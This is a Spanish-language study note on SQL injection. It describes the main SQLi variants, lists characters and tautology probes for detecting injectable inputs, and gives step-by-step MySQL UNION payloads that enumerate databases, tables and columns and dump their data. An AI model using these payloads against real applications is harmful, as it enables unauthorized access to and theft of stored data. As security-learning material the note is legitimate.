
![[sql-vs-noSql.webp|484x362]]![[relationalDB.webp|529x363]]
# Tipos de SQLi
## In-band SQLi
### Error-based SQLi
El atacante envía queries buscando provocar errores en la base de datos, con el objetivo de aprovechar la información proporcionada por los errores para recavar información sobre la BBDD.
### Union-based SQLi
Esta técnica se aprovecha del operador SQL `UNION`, que fusiona varios comandos de tipo `SELECT` en una respuesta HTTP, dicha respuesta podría contener información sensible.
## Inferential (Blind) SQLi
### Boolean
El atacante envía una query buscando una respuesta de la base de datos, esta respuesta variará en función de si la consulta resulta evaluada como `TRUE` o `FALSE`, en base al resultado la respuesta HTTP se mantendrá o cambiará, haciendo posible deducir como la DB ha evaluado la query.
### Time-based
El atacante envía una query que hace "pensar" a la DB durante unos segundos antes de responder, el atacante puede deducir en base al tiempo que tardó en responder si la query se evalúo como `TRUE` o `FALSE`.
## Out-of-band SQLi
Este tipo de ataques se llevan a cabo cuando el atacante no puede usar el mismo canal para enviar las queries y recavar la información, o cuando un servidor es demasiado lento/inestable para realizar estas acciones. Las técnicas out-of-band explotan la capacidad del servidor de hacer peticiones DNS o HTTP para exfiltrar información. 


# Detección
Para explotar SQLi, la idea es buscar inputs de usuario en la aplicación que no están siendo correctamente sanitizados, de manera que podamos enviar una query arbitraria a la base de datos.
Esta es una lista con algunos caracteres que pueden triggerear errores de SQL, exponiendo un input vulnerable.
```SQL
'
"
;
)
*

%27
%22
%23
%3B
%29
%2A

%%2727
%25%27

U+02B9
U+02BA

`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP

page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
Otra opción es identificar estas fallas mediante *Timing Attacks*, ciertos comandos como `SLEEP` o `BENCHMARK` en MySQL pueden causar un delay en la respuesta, indicando un punto de entrada.

### [DBMS identification guide](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification-keyword-based)

# Exfiltración manual
##### #1: Sacar el número total de columnas
Inyectado el siguiente payload, podemos incrementar el número hasta que la aplicación de un error, ahí sabremos la cantidad total de columnas 
```sql
' ORDER BY 1-- -
```
##### #2: Recuperar todas las DBs
Sin concatenar; puede causar errores
```sql
' UNION SELECT schema_name, 2, 3, 4, 5 FROM information_schema.schemata-- -
```
Con concatenaciones
```sql
' UNION SELECT GROUP_CONCAT(schema_name), 2, 3, 4, 5 FROM information_schema.schemata-- -
```
##### #3: Recuperar las tablas y columnas de una DB concreta
Con esta query se recuperan las tablas
```sql
' UNION SELECT GROUP_CONCAT(table_name), 2, 3, 4, 5 FROM information_schema.tables WHERE table_schema = '<Base de Datos>'-- -
```
Y con esta otra las columnas de una tabla
```sql
' UNION SELECT GROUP_CONCAT(column_name), 2, 3, 4, 5 FROM information_schema.columns WHERE table_schema = '<Base de Datos>' AND table_name = '<Tabla>'-- -
```
##### #4 : Recuperar los datos
```sql
' UNION SELECT GROUP_CONCAT(<Columna>, ':', <Columna>), 2, 3, 4, 5 FROM <Base de Datos>.<Tabla>-- -
```


# Recursos
[PortSwigger SQLi cheatseet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[OVHCloud](https://www.ovhcloud.com/es-es/learn/relational-vs-non-relational-databases/)
[Imperva](https://www.imperva.com/learn/application-security/sql-injection-sqli/)
[PortSwigger](https://portswigger.net/web-security/sql-injection#what-is-the-impact-of-a-successful-sql-injection-attack)
[PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
[# Bug Bounty Hunters are WRONG about this‘ OR 1=1](https://youtu.be/-7mrIzjQnhs)